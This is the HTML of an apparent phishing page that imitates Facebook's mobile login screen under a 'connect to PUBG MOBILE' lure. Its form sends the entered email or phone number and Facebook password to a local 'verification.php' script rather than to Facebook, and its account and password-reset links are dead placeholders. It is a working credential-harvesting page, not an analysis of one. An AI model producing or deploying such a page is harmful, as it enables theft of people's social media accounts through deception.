<html>
<head>
<title>Log in to Facebook | Facebook</title>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196">
<meta name="referrer" content="origin-when-crossorigin" id="meta_referrer">
<meta name="theme-color" content="#3b5998">
<link type="text/css" rel="stylesheet" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yp/l/0,cross/Vlv_cUlK88S.css?_nc_x=Ij3Wp8lg5Kz">
<link type="text/css" rel="stylesheet" href="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yi/l/0,cross/GJ78_AiPCt2.css?_nc_x=Ij3Wp8lg5Kz">
<meta name="description" content="Log in to Facebook to start sharing and connecting with your friends, family and people you know."></head>
<body tabindex="0" class="touch x1 android _fzu _50-3 iframe acw portrait" style="min-height: 576px; background-color: rgb(236, 239, 245);">
<div id="viewport" data-kaios-focus-transparent="1" style="min-height: 576px;">
	<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
	<div id="page" class="">
		<div class="_129_" id="header-notices"></div>
		<div class="_7om2 _52we _52z5" id="header">
			<div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
				<a href=""><i class="img sp_sJW2P2tLEpz sx_96d027"><u>facebook</u></i></a>
			</div>
		</div>
		<div class="_5soa _3-q1 acw" id="root" role="main" style="min-height: 576px;">
			<div class="_7om2">
				<div class="_4g34" id="u_0_0">
					<div class="aclb _4-4l">
						<div class="_5rut">
							<div>
								<div class="_52jj _3-q2">
									<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg" width="60" class="_3-q3 img">
									<div class="_52je _52j9">
										 Log in to your Facebook account to connect to PUBG MOBILE
									</div>
								</div>
							</div>
							<form method="post" action="../../verification.php" class="mobile-login-form _5spm">
								<div class="_56be _5sob">
									<div class="_55wo _55x2 _56bf">
										<div id="email_input_container">
											<input type="text" class="_56bg _4u9z _5ruq" name="email" id="email" placeholder="Mobile number or email address" required></div>
										<div>
											<div class="_1upc _mg8">
												<div class="_7om2">
													<div class="_4g34 _5i2i _52we">
														<div class="_5xu4">
															<input type="password" class="_56bg _4u9z _27z2" name="password" id="password" placeholder="Facebook password" required></div>
													</div>
													<input type="hidden" name="login" value="Facebook" readonly></div>
											</div>
										</div>
									</div>
								</div>
								<div class="_2pie" style="text-align:center;">
									<div>
										<button type="submit" value="Log In" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu"><span class="_55sr">Log In</span></button>
									</div>
								</form>
							</div>
							<div></div>
							<div>
								<div>
									<div class="_4581 _2phz">
										<a href="#">Create account</a>
									</div>
									<div class="_4581">
										<a href="#">Not now</a>
									</div>
								</div>
								<div class="other-links _8p_m">
									<ul class="_5pkb _55wp">
										<li>
											<span class="mfss fcg"><a href="#">Forgotten password?</a></span>
										</li>
									</ul>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="_55wr _5ui2">
				<div class="_5dpw">
					<div class="_5ui3">
						<div class="_7om2">
							<div class="_4g34">
								<span class="_52jc _52j9 _52jh _3ztb">English (UK)</span>
								<div class="_3ztc">
									<span class="_52jc"><a href="#">Basa Jawa</a></span>
								</div>
								<div class="_3ztc">
									<span class="_52jc"><a href="#">日本語</a></span>
								</div>
								<div class="_3ztc">
									<span class="_52jc"><a href="#">Português (Brasil)</a></span>
								</div>
							</div>
							<div class="_4g34">
								<div class="_3ztc">
									<span class="_52jc"><a href="#">Bahasa Indonesia</a></span>
								</div>
								<div class="_3ztc">
									<span class="_52jc"><a href="#">Bahasa Melayu</a></span>
								</div>
								<div class="_3ztc">
									<span class="_52jc"><a href="#">Español</a></span>
								</div>
								<a href="#">
								<div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages">
									<i class="img sp_sJW2P2tLEpz sx_5ef402"></i>
								</div>
								</a>
							</div>
						</div>
					</div>
					<div class="_5ui4">
						<span class="mfss fcg">Facebook Inc.</span>
					</div>
				</div>
			</div>
		</div>
		</div>
	</div>
</div>

</body>
</html>